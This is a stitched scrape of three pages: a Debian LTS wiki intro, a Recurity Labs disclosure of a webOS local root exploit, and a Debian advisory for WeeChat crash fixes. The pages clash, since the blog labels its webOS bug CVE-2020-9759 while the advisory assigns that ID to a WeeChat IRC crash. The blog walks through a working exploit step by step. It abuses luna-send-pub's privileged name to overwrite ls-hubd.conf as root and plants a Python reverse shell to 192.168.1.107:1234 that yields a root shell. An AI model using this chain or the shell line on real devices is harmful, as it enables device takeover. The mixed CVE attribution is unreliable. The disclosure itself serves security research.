=== Content from wiki.debian.org_8d48714b_20250119_134531.html ===

[![Debian](https://www.debian.org/Pics/openlogo-50.png)](https://www.debian.org "Debian Homepage")

[Wiki](/FrontPage "Debian Wiki Homepage")

[Login](/LTS?action=login)

* [FrontPage](/FrontPage)
* [RecentChanges](/RecentChanges)
* [FindPage](/FindPage)
* [HelpContents](/HelpContents)
* [LTS](/LTS)

Search:

[![Debian](https://www.debian.org/Pics/openlogo-50.png)](https://www.debian.org "Debian Homepage")
[Wiki](/FrontPage "Debian Wiki Homepage")/

* [Login](/LTS?action=login)
* Comments
* [Info](/LTS?action=info)
* [Attachments](/LTS?action=AttachFile)
* More Actions:
  Raw Text
  Print View
  Render as Docbook
  Delete Cache
  ------------------------
  Check Spelling
  Like Pages
  Local Site Map
  ------------------------
  Rename Page
  Delete Page
  ------------------------
  Subscribe User
  ------------------------
  Remove Spam
  Revert to this revision
  Package Pages
  ------------------------
  Load
  Save
  SlideShow

# * [LTS](/LTS)

[Translation(s)](/DebianWiki/EditorGuide#translation): [English](/LTS) - [Deutsch](/de/LTS) - [Español](/es/LTS) - [Français](/fr/LTS) - [Italiano](/it/LTS) - [한국어](/ko/LTS) - [Português](/pt/LTS) - [Português (Brasil)](/pt_BR/LTS) - [Русский](/ru/LTS)

# Debian Long Term Support

Debian Long Term Support (LTS) is a project to extend the lifetime of all Debian stable releases to (at least) 5 years. Debian LTS is not handled by the Debian Security and Release teams, but by a separate group of volunteers and companies interested in making it a success.

Thus the Debian LTS team takes over security maintenance of the various releases once the Debian Security team stops its work.

![/!\](/htdocs/debwiki/img/alert.png "/!\")

LTS ([last modified 2024-08-15 02:46:47](/LTS?action=info))

* Debian [privacy policy](https://www.debian.org/legal/privacy), Wiki [team](/Teams/DebianWiki), [bugs](https://bugs.debian.org/wiki.debian.org) and [config](https://salsa.debian.org/debian/wiki.debian.org).
* Powered by [MoinMoin](https://moinmo.in/ "This site uses the MoinMoin Wiki software.") and [Python](https://moinmo.in/Python "MoinMoin is written in Python."), with hosting provided by [Metropolitan Area Network Darmstadt](https://www.man-da.de/).



=== Content from blog.recurity-labs.com_1193c087_20250119_120113.html ===

[## The Recurity Lablog](/)

* [Posts](/)

computer security, research, reverse engineering and high level considerations

Written by Andreas

on February 03, 2021
# CVE-2020-9759 - Getting root on webOS

```
Update (2022-02-04): Please note that LG actually did request and receive a CVE number, after this post was published. The title of the post has been updated accordingly.

```
# The TL;DR

A while back, I decided to devote some research time looking into the inner workings of webOS to be able to better understand the security posture of the platform as whole, and to better be able to spot security issues in webOS applications. This led to some interesting discoveries, including a local privilege escalation method, which will be outlined in this blog post.

# Some Caveats

As part of the LG webOS TV SDK, LG provides a webOS TV emulator running on [QEMU](https://www.qemu.org/). This post will use this emulator, running webOS version 5.0.0-88, to demonstrate the issue.

Now, before we start, it should be noted that this issue does *not* affect the one webOS hardware device in my possession; an LG Smart TV with model name 65SM8500PLA and webOS version 4.8.0-52002. This is due to customizations made by LG, which restrict access to the vulnerable component. LG furthermore claims that this is the case for all their devices running webOS, which may well be the case (or not).

However, as the root cause of the issue is within code rather than LGâs custom configuration, we feel that it is still valid. As far as Recurity Labs are aware, LG is the maintainer of the [webOS Open Source Edition (OSE)](https://github.com/webosose), which (to date) has not been updated to remediate this issue, even though LG claims that it has been fixed. This implies that the root cause will not be remediated. This also means that LG, despite our repeated inquires, did not request a CVE number for this issue - hence the title âCVE-2020-XXXXXâ (the issue was initially reported to LG on October 05, 2020).

It is also interesting to note that LG repeatedly tried to play down the issues (yes, plural, but thatâs for another time) I reported, but as soon as I mentioned that I was going to do a write-up they turned around and asked if I wouldnât rather participate in their bug bounty program instead. If there is one thing that is constant in this world â¦

# webOS - A Brief History

[webOS](https://en.wikipedia.org/wiki/WebOS) is a Linux-based operating system and media application platform for smart embedded devices. It was originally developed by [Palm, Inc.](https://en.wikipedia.org/wiki/Palm%2C_Inc.) and later included in the acquisition of Palm by HP, who released the source code under an open source license in 2011, which became known as Open webOS. In 2013, HP sold webOS to LG Electronics, who started using it in their smart TVs, refrigerators, watches etc. In 2018, LG announced the [webOS Open Source Edition (OSE)](https://github.com/webosose), which includes additional features for smart TVs and other devices developed by LG.

# High-Level Architecture

Applications in webOS are called âWeb Appsâ, and are essentially JavaScript client applications executed in a locked-down headless browser, with some additional management handled by the internal `WebAppManager` service. The apps are run by unprivileged users, and have very limited access to the filesystem. Applications can also implement services, which are run in `node.js` and must be packaged and included within the applicationâs `.ipk` package. These services are run as the same unprivileged user as the apps themselves.

webOS also implements the Luna Service API, which enables Web apps as well as internal system services to call different APIs for interacting with webOS features and the underlying system. The APIs are made available via âLuna Busâ, which exposes one private and one public channel. The APIs are somewhat logically grouped together, and can include both public (exposed by the public channel and available to any app) and private (exposed by the private channel and only available for internal or privileged communication) methods. Furthermore, each method can (and often does) implement their own access controls, for more granular access restrictions.

And this is where our story begins â¦

# A Case of Mistaken Identity

One of the APIs the Luna Service provides is the `Downloadmanager`. Like all internal APIs, the `Downloadmanager` runs as `root`.

```
root       900  0.0  0.9  15356  9332 ?        SLs  09:06   0:00 /usr/bin/LunaDownloadMgr

```

The most essential method the `Downloadmanager` implements is simply called `download`, and enables an application or service to download a file over the network. This method is callable by any application and accepts a number of parameters, but implements its own restrictions with regard to where the file will be downloaded, and what it will be called. This is enforced by checking that the calling application has one of the privileged prefixes `com.palm.`, `com.webos.`, or `com.palm.`, which third-party applications are not allowed to use.

From the `DownloadService.cpp` class:

```
// only privileged service don't have restrictions
    if (!isPrivileged(caller))

```

And from the `DownloadManager.cpp` class:

```
bool DownloadManager::isPrivileged(const std::string& sender)
{
    if(sender.find("com.palm.") == 0 || sender.find("com.webos.") == 0 || sender.find("com.lge.") == 0 )
        return true;

    return false;
}

```

If this check fails, the service will disregard any parameter except `target`, which specifies the file to download, and will instead download the file to the default location `/media/internal/downloads` on the filesystem.

However, privileged applications that pass the check, such as internal services and native applications, are able to set additional parameters, such as `targetDir` and `targetFilename` (which forces existing files with the same name to be overwritten). These options are used, e.g. when the system installs applications via the Internet, for example by an App Store.

After spending a fair amount of time trying to figure out how to get past this check (but sadly to no avail), I decided to look elsewhere. Enter the `luna-send` tool.

webOS implements a pair of command line tools located in `/usr/bin` called `luna-send` and `luna-send-pub`, which can be used to call the Luna Service APIs locally from the command line. `luna-send` is used to call private API methods and is only available to the `root` user, whereas `luna-send-pub` is used to call public methods and, hence, can be called by any user. These tools are frequently used by internal webOS startup and maintenance scripts, making them a fundamental part of the platform.

When inspecting the source code for the `luna-send` binaries, I noticed the following extract\_

```
const char PUBLIC_SERVICE_NAME[] = "com.webos.lunasendpub";
const char PRIVATE_SERVICE_NAME[] = "com.webos.lunasend";

```

As it turns out, the name `luna-send-pub` used when communicating with the Luna Service API is `com.webos.lunasendpub`, which means that it will effectively pass the check implemented by the `Downloadmanager`, and will thus be considered a privileged caller. This effectively enables us to be able to download arbitrary files to any writable part of the filesystem as the `root` user, since the `Downloadmanager` is running as `root`. Please keep in mind that this is possible for any application implementing its own service, for example by using the `node.js` `child_process` module to call `luna-send-pub` on the command line.

(The implications of a design in which a command line tool can call internal system services *and* essentially specify its own permissions through whatever name it choses for itself is not lost on the author, but will be explored in a different blog post.)

While arbitrary file downloads as `root` is an issue in itself, I of course also wanted to try to use it for something more interesting, and hence began the hunt for a local privilege escalation.

# Setting the Scene

The LG webOS TV Emulator, which was mainly used for the dynamic parts of this project, grants developers the same type of unprivileged shell access to webOS as a third-party application has. For an easier overview, all following steps will be shown using the shell directly rather than via a Web App service. For those, who would like to implement a Web App that does the same things, LG offers some basic documentation on how to write apps and services on their developer website available [here](http://webostv.developer.lge.com/develop/building-your-first-web-app-webos-tv/).

The following guide can be used to root the LG webOS TV Emulator, but may need some tweaking with regard to which files and directories to use on other webOS devices and implementations.

# Getting root

While we are now able to download files to anywhere on the filesystem (if mounted as writable), we still cannot make the files we download executable as they will be owned by the `root` user, meaning that simply overwriting some binary or shell script will likely not be very effective. What we can do, however, is overwrite a configuration file specifying the path to an executable, and then point it to our own executable someplace on the filesystem where we have the necessary privileges. After looking around a bit, I found a good candidate for this in the `/etc/luna-service2/ls-hubd.conf` file. This is the configuration file for the Luna hub daemon, which acts as a middleman for internal communication, and contains the following extract:

```
[Dynamic Services]
ExecPrefix=/usr/sbin/setcpushares-ls2
LaunchTimeout=300000

```

On inspection, the `/usr/sbin/setcpushares-ls2` file contains the following:

```
#!/bin/sh

# usage: $0 cmd args...
# Used by LS2 as a wrapper for invoking dynamic services that ensures they are in the correct groups

exec "$@"

```

This file appears to be a shell script used to launch dynamic services, likely during start-up. As the Luna Service hub daemon runs as `root`, this means that, if we can overwrite the configuration file and point the `ExecPrefix` to our own script file, it will be possible to run arbitrary commands within the script as the `root` user.

To achieve this, the following steps can be taken:

1) On a local computer, create the file `ls-hubd.conf` with the following content:

```
[General]
PidDirectory=/var/run/ls2
LogServiceStatus=false
ConnectTimeout=20000

[Watchdog]
Timeout=60
FailureMode=noop

[Dynamic Services]
ExecPrefix=/home/developer/setcpushares-ls
LaunchTimeout=300000

[Security]
Enabled=true
MonitorExePath=/usr/sbin/ls-monitor
JsServiceExePath=js
AllowNullOutboundByDefault=true
ContainersDirectories=/usr/share/luna-service2/containers.d
ManifestsDirectories=/usr/share/luna-service2/manifests.d;/mnt/otycabi/usr/share/luna-service2/manifests.d;/mnt/otncabi/usr/share/luna-service2/manifests.d
ManifestsVolatileDirectories=/var/luna-service2/manifests.d;/var/luna-service2-dev/manifests.d
DevmodeCertificate=/var/luna-service2-dev/devmode_certificate.json
DefaultDevmodeCertificate=/usr/share/luna-service2/devmode_certificate.json

```

Notice that the `ExecPrefix` value has been modified to point to `home/developer/setcpushares-ls`. The reason for not simply overwriting the script file is because, on most embedded devices, the `/usr/sbin` directory is likely to be mounted as read-only, whereas `/etc/` (the location of the config file) might not be. On the LG webOS TV Emulator, the `/home/developer` directory is writable by our unprivileged user, on other devices some other directory may have to be used.

2) Next, create the file `home/developer/setcpushares-ls` with the following content on the webOS device:

```
#!/bin/sh

# usage: $0 cmd args...
# Used by LS2 as a wrapper for invoking dynamic services that ensures they are in the correct groups

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.107",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'

exec "$@"

```

3) Make this file executable with the command `chmod +x setcpushares-ls`.

(If it is somehow necessary to also download the modified script file, the path in `ExecPrefix` can simply be replaced with `/bin/sh /path/to/script` to get around the need to make the script file executable.)

4) Download the modified `ls-hubd.conf` file to the webOS device using the following command:

```
luna-send-pub -n 1 -f luna://com.webos.service.downloadmanager/download '{"target":"http://192.168.1.107:8000/ls-hubd.conf","targetDir":"/etc/luna-service2","targetFilename":"ls-hubd.conf"}'

```

5) After this, open a `netcat` listener on port 1234 on the IP address specified in the Python reverse shell in step 2.

```
nc -l 1234

```

6) Restart the webOS device. Once the system is completely started, the `netcat` listener set-up in step 5 should receive a connection, granting `root` access to the system.

```
andreas@deathstar2:~$ nc -l 1234
/bin/sh: can't access tty; job control turned off
/ # id
uid=0(root) gid=0(root)
/ # uname -a
Linux qemux86 4.18.14-yocto-standard #1 SMP PREEMPT Fri Feb 7 05:57:22 UTC 2020 x86_64 GNU/Linux

```

At this point, I simply changed the password of the `root` user, and replaced the Python reverse shell in the `/home/developer/setcpushares-ls` file with a command to open an additional SSH listener with `root` and password login allowed. This will provide stable access to a much nicer root shell, and should aid further research.

# Final Thoughts

While LG claims that this issue does not affect their devices, it is our impression that it affects webOS in general, and therefore should be taken seriously. In the commincation flow, LG claimed that it would be fixed âwithin a weekâ on the 26th of January 2021 (the issue was initially reported to LG on October 05, 2020), and since that time has well passed, and due to the fact that the issue is not remotely exploitable, we decided to release this information.

If nothing else it may aid other fellow hackers by granting `root` access to the LG webOS emulator.

[←](http://blog.recurity-labs.com/2021-11-18/safari_hsts)
[→](http://blog.recurity-labs.com/2020-12-23/code-audit-training-archive)
Top

© 2023 Recurity Labs. Made with Jekyll using the [Tale](https://github.com/chesterhow/tale/) theme.

[GDPR / DS-GVO Statement](https://www.recurity-labs.com/company/GDPR)



=== Content from lists.debian.org_0e8e5178_20250119_120113.html ===


---

[[Date Prev](msg00017.html)][[Date Next](msg00019.html)]
[[Thread Prev](msg00017.html)][[Thread Next](msg00019.html)]
[[Date Index](maillist.html#00018)]
[[Thread Index](threads.html#00018)]

# [SECURITY] [DLA 2770-1] weechat security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 2770-1] weechat security update
* *From*: Adrian Bunk <bunk@debian.org>
* *Date*: Thu, 30 Sep 2021 15:06:58 +0300
* *Message-id*: <[[🔎]](/msgid-search/20210930120658.GA5785%40localhost) [20210930120658.GA5785@localhost](msg00018.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian LTS Advisory DLA-2770-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                          Adrian Bunk
September 30, 2021                            <https://wiki.debian.org/LTS>
- -------------------------------------------------------------------------

Package        : weechat
Version        : 1.6-1+deb9u3
CVE ID         : CVE-2020-8955 CVE-2020-9759 CVE-2020-9760 CVE-2021-40516
Debian Bug     : 951289 993803

Several vulnerabilities were fixed in the chat client WeeChat.

CVE-2020-8955

    A crafted irc message 324 (channel mode) could result in a crash.

CVE-2020-9759

    A crafted irc message 352 (who) could result in a crash.

CVE-2020-9760

    A crafted irc message 005 (setting a new mode for a nick) could
    result in a crash.

CVE-2021-40516

    A crafted WebSocket frame could result in a crash in the Relay plugin.

For Debian 9 stretch, these problems have been fixed in version
1.6-1+deb9u3.

We recommend that you upgrade your weechat packages.

For the detailed security status of weechat please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/weechat>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEEOvp1f6xuoR0v9F3wiNJCh6LYmLEFAmFVqGIACgkQiNJCh6LY
mLFY8A/8DkcAHSFWnHcz1AtjmDqO4jAYR4/lkDXG8tik3OQG9TPdxv/trCPgmI40
7J/Bs4gB7gDPPkbuIA4EHKAM9Vh1w4uP2uWnu/cbYHDnK3ELlBLNOgpdGX+01bQa
0m8Iujyg126/oElKeosEC9TG4NcyFgLBfkeGpAsNFCHu9mDCeKZiuqG/iI07IHu9
DxEo2+8nSFsbyqP6bPuBcTRUm66ZdnJcxoIDfT85xx7PEeSc8tNCqz5PeUAgvxBU
qZeJyRQkyj/ED170bdySvdDCbAxr3vwPs1lCjsClZCmHS7UNiYSFvduRt7U3wt1C
NEBaNHKzbZQZATcuS27XCecjqv0vn7INhzQis9nAafIpjajBjTV0ytNAKheM/xdJ
Q/WtLZuoNL0v0zyihPNgBzp1jTYiM76+gbSLT8YxF9FN/YDdV33uQ7DcK7PS2+9/
yVxtqMofF87Yxg4CeCEgZSYmyqBFf0HJyu+9UFSNyg4FdhjPE4QC4+y7gPjZWlLt
jTY7QpAU21jA+sSRbm5Bznhns67sZhE+AaFjC9SM0DvJBpNFLB0SIi/IWeo3ZLUJ
MduWosNHHPQdTyMn600qJlBa2yO+HSmV4Rfa1CGHLF07TA3tGgLviEsoXG9SbmdE
2CKN+CMBhWGJOi9iym+++x3HZTQ9DciUxuvo6u31Tq1RqZIrYog=
=ZSvB
-----END PGP SIGNATURE-----

```

---


